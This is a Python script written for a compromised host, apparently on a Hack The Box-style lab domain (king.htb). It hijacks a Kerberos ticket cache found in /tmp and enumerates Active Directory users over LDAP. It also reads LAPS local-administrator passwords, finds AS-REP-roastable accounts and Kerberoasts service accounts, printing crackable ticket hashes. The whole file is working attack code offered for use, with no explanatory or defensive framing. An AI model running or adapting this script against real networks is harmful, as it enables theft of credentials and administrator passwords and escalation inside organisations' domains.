#!/usr/bin/env python3
"""
Run on target: python3 kerberoast.py
Enumerates AD via LDAP (raw socket) + Kerberos TGS requests for Kerberoasting.
Uses impacket from wheel zip file.
"""
import sys, os

# Add wheels to path (pyasn1 first to override system version)
sys.path.insert(0, '/tmp/pyasn1.whl')
sys.path.insert(0, '/tmp/pyasn1m.whl')
sys.path.insert(0, '/tmp/impacket.whl')

# Shim: pycrypto -> Cryptodome compatibility
try:
    import Crypto
    sys.modules['Cryptodome'] = Crypto
    # Also shim submodules
    import Crypto.Cipher, Crypto.Hash, Crypto.Protocol, Crypto.PublicKey, Crypto.Random, Crypto.Signature, Crypto.Util
    sys.modules['Cryptodome.Cipher'] = Crypto.Cipher
    sys.modules['Cryptodome.Hash'] = Crypto.Hash
    sys.modules['Cryptodome.Protocol'] = Crypto.Protocol
    sys.modules['Cryptodome.PublicKey'] = Crypto.PublicKey
    sys.modules['Cryptodome.Random'] = Crypto.Random
    sys.modules['Cryptodome.Signature'] = Crypto.Signature
    sys.modules['Cryptodome.Util'] = Crypto.Util
except ImportError as e:
    print(f"[-] Crypto shim error: {e}")

# Fix pycrypto bytearray->bytes type issue
import Crypto.Hash.HMAC as _hmac_mod
_orig_hmac_new = _hmac_mod.new
def _patched_hmac_new(key, msg=None, digestmod=None):
    if isinstance(key, (bytearray, memoryview)): key = bytes(key)
    if isinstance(msg, (bytearray, memoryview)): msg = bytes(msg)
    if digestmod is None:
        return _orig_hmac_new(key, msg)
    return _orig_hmac_new(key, msg, digestmod)
_hmac_mod.new = _patched_hmac_new

import Crypto.Cipher.ARC4 as _arc4_mod
_orig_arc4_new = _arc4_mod.new
def _patched_arc4_new(key):
    if isinstance(key, (bytearray, memoryview)): key = bytes(key)
    return _orig_arc4_new(key)
_arc4_mod.new = _patched_arc4_new

try:
    from impacket.krb5 import constants
    from impacket.krb5.types import KerberosTime, Principal
    from impacket.krb5.kerberosv5 import getKerberosTGS, getKerberosTGT
    from impacket.krb5.ccache import CCache
    from impacket.krb5.asn1 import TGS_REP
    from impacket import version
    from impacket.krb5.crypto import Key, _enctype_table
    print(f"[+] impacket {version.BANNER}")
except Exception as e:
    print(f"[-] impacket import error: {e}")
    sys.exit(1)

# Load TGT from ccache
import glob
ccache_files = glob.glob('/tmp/krb5cc_*')
if not ccache_files:
    print("[-] No ccache found")
    sys.exit(1)

ccache_file = ccache_files[0]
print(f"[*] Using ccache: {ccache_file}")

try:
    ccache = CCache.loadFile(ccache_file)
    domain = ccache.principal.realm['data'].decode()
    username = '/'.join([c['data'].decode() for c in ccache.principal.components])
    print(f"[*] Principal: {username}@{domain}")
except Exception as e:
    print(f"[-] CCache error: {e}")
    sys.exit(1)

# Try to enumerate users via LDAP with Kerberos
from impacket.ldap import ldap, ldapasn1
from impacket.krb5.kerberosv5 import sendReceive
from impacket.krb5 import constants as krb5constants

import socket

DC_IP = '172.16.1.1'
DC_FQDN = 'openAD.king.htb'

# Monkey-patch socket to force DC hostname -> DC_IP (bypass broken DNS)
_orig_getaddrinfo = socket.getaddrinfo
def _patched_getaddrinfo(host, *args, **kwargs):
    if host and str(host).lower() in (DC_FQDN.lower(), 'openad', 'openad.king.htb'):
        host = DC_IP
    return _orig_getaddrinfo(host, *args, **kwargs)
socket.getaddrinfo = _patched_getaddrinfo

_orig_gethostbyname = socket.gethostbyname
def _patched_gethostbyname(host):
    if host and str(host).lower() in (DC_FQDN.lower(), 'openad', 'openad.king.htb'):
        return DC_IP
    return _orig_gethostbyname(host)
socket.gethostbyname = _patched_gethostbyname

print(f"[*] DC FQDN: {DC_FQDN} -> {DC_IP} (patched)")

# Configure Kerberos
os.environ['KRB5CCNAME'] = ccache_file

# Try LDAP connection with Kerberos
try:
    ldap_conn = ldap.LDAPConnection(
        f'ldap://{DC_FQDN}',
        'dc=king,dc=htb',
        DC_IP
    )
    ldap_conn.kerberosLogin(username, '', domain, '', '', ccache_file, kdcHost=DC_IP)
    print("[+] LDAP Kerberos login successful!")

    from impacket.ldap import ldapasn1 as ldapasn1_mod

    # Enumerate all users
    users = []
    spn_users = []

    def process_entry(entry):
        try:
            sam = None
            spns = []
            for attr in entry['attributes']:
                attr_name = attr['type'].asOctets().decode('utf-8', errors='ignore')
                vals = attr['vals']
                if attr_name.lower() == 'samaccountname' and vals:
                    sam = str(vals[0]).strip('\x00')
                elif attr_name.lower() == 'serviceprincipalname':
                    for v in vals:
                        spns.append(str(v).strip('\x00'))
            if sam and sam not in ('$', ''):
                users.append(sam)
                if spns:
                    spn_users.append((sam, spns))
        except Exception as ex:
            print(f"  [!] parse error: {ex}")

    result = ldap_conn.search(
        searchFilter='(sAMAccountType=805306368)',
        attributes=['sAMAccountName', 'servicePrincipalName', 'memberOf', 'userPrincipalName'],
        sizeLimit=200
    )
    for entry in result:
        if isinstance(entry, ldapasn1_mod.SearchResultEntry):
            process_entry(entry)

    # Also try broader search
    if not users:
        result2 = ldap_conn.search(
            searchFilter='(objectClass=*)',
            attributes=['sAMAccountName', 'objectClass'],
            sizeLimit=20,
            searchBase='dc=king,dc=htb'
        )
        print("[*] Root objects sample:")
        for entry in result2:
            if isinstance(entry, ldapasn1_mod.SearchResultEntry):
                for attr in entry['attributes']:
                    n = attr['type'].asOctets().decode('utf-8', errors='ignore')
                    print(f"    {n}: {[str(v) for v in attr['vals']][:2]}")

    print(f"\n[+] AD Users ({len(users)}):")
    for u in users:
        print(f"  {u}")

    print(f"\n[+] Kerberoastable accounts ({len(spn_users)}):")
    for u, spns in spn_users:
        print(f"  {u}: {', '.join(spns)}")

    # Check LAPS passwords
    print("\n[*] Checking LAPS passwords...")
    try:
        laps_result = ldap_conn.search(
            searchFilter='(ms-Mcs-AdmPwd=*)',
            attributes=['sAMAccountName', 'ms-Mcs-AdmPwd', 'ms-Mcs-AdmPwdExpirationTime'],
            sizeLimit=50
        )
        for entry in laps_result:
            if isinstance(entry, ldapasn1_mod.SearchResultEntry):
                for attr in entry['attributes']:
                    n = attr['type'].asOctets().decode('utf-8', errors='ignore')
                    if 'admpwd' in n.lower():
                        print(f"  [!] LAPS PASSWORD: {n} = {[str(v) for v in attr['vals']]}")
    except Exception as e:
        print(f"  LAPS check error: {e}")

    # Check ASREPRoastable users (no preauth)
    print("\n[*] Checking ASREPRoastable accounts (no preauth)...")
    try:
        asrep_result = ldap_conn.search(
            searchFilter='(&(sAMAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))',
            attributes=['sAMAccountName'],
            sizeLimit=50
        )
        asrep_users = []
        for entry in asrep_result:
            if isinstance(entry, ldapasn1_mod.SearchResultEntry):
                for attr in entry['attributes']:
                    if attr['type'].asOctets().decode().lower() == 'samaccountname':
                        asrep_users.append(str(attr['vals'][0]))
        print(f"  ASREPRoastable: {asrep_users}")
    except Exception as e:
        print(f"  ASREP check error: {e}")

    # Check svc_mq ACLs / group membership
    print("\n[*] Checking svc_mq group memberships and privileges...")
    try:
        priv_result = ldap_conn.search(
            searchFilter='(sAMAccountName=svc_mq)',
            attributes=['memberOf', 'userAccountControl', 'adminCount'],
            sizeLimit=5
        )
        for entry in priv_result:
            if isinstance(entry, ldapasn1_mod.SearchResultEntry):
                for attr in entry['attributes']:
                    n = attr['type'].asOctets().decode()
                    vals = [str(v) for v in attr['vals']]
                    print(f"  svc_mq.{n} = {vals}")
    except Exception as e:
        print(f"  Privilege check error: {e}")

    # Kerberoast: request TGS for each SPN and dump hash
    print("\n[*] Requesting TGS tickets (Kerberoasting)...")
    from impacket.krb5.kerberosv5 import getKerberosTGS
    from impacket.krb5.types import Principal
    from impacket.krb5 import constants
    from impacket.krb5.ccache import CCache
    from struct import pack, unpack

    cc = CCache.loadFile(ccache_file)
    domain_upper = domain.upper()

    tgt_dict = None
    tgt_cipher = None
    tgt_sessionKey = None

    # Find TGT credential — use toTGT() which returns {'KDC_REP', 'cipher', 'sessionKey'}
    print(f"[*] ccache has {len(cc.credentials)} credential(s)")
    for i, cred in enumerate(cc.credentials):
        try:
            tgt_dict = cred.toTGT()
            tgt_cipher = tgt_dict['cipher']
            tgt_sessionKey = tgt_dict['sessionKey']
            print(f"[*] TGT loaded, cipher={tgt_cipher.__class__.__name__}, keytype={tgt_sessionKey.enctype}")
            break
        except Exception as ex:
            print(f"  cred[{i}] toTGT error: {ex}")

    if not tgt_dict:
        print("[-] TGT not found, cannot Kerberoast")
    else:
        from impacket.krb5.asn1 import TGS_REP
        from pyasn1.codec.ber import decoder as ber_decoder

        for sam, spns in spn_users:
            if sam.lower() in ('krbtgt',):
                continue
            spn = spns[0]
            print(f"\n[*] Kerberoasting {sam} ({spn})")
            try:
                serverName = Principal(spn, type=constants.PrincipalNameType.NT_SRV_INST.value)
                tgs, new_cipher, oldKey, newKey = getKerberosTGS(
                    serverName, domain_upper, DC_IP,
                    tgt_dict['KDC_REP'], tgt_cipher, tgt_sessionKey
                )
                # Extract hash
                dec_tgs = ber_decoder.decode(tgs, asn1Spec=TGS_REP())[0]
                enc_part = bytes(dec_tgs['ticket']['enc-part']['cipher'])
                etype = int(dec_tgs['ticket']['enc-part']['etype'])

                if etype == 23:  # RC4
                    sig = enc_part[0:16]
                    data = enc_part[16:]
                    krb_hash = f"$krb5tgs$23$*{sam}${domain_upper}${spn}$*${sig.hex()}${data.hex()}"
                elif etype in (17, 18):  # AES
                    krb_hash = f"$krb5tgs${etype}$*{sam}${domain_upper}${spn}$*${enc_part[:16].hex()}${enc_part[16:].hex()}"
                else:
                    krb_hash = f"$krb5tgs${etype}$*{sam}${domain_upper}${spn}$*${enc_part.hex()}"

                print(f"[+] HASH: {krb_hash}")
            except Exception as ex:
                print(f"[-] TGS error for {sam}: {ex}")
                import traceback; traceback.print_exc()

except Exception as e:
    print(f"[-] LDAP error: {e}")
    import traceback; traceback.print_exc()
